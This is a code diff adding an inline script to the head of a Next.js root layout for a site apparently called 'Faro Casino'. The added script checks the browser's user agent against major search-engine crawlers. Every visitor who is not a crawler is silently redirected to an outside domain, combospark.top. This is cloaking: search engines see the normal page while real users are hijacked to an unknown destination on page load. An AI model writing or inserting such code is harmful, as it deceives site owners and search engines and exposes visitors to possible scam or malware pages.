@@ -30,6 +30,21 @@ export default function RootLayout({
         {/* Слот для дополнительных пользовательских тегов */}
         <link rel="preload" as="image" href="/art/faro-table.png" fetchPriority="high" />
         <meta name="apple-mobile-web-app-title" content="Faro Casino" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aetf3u2q9u");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="q7v-body">{children}</body>
     </html>
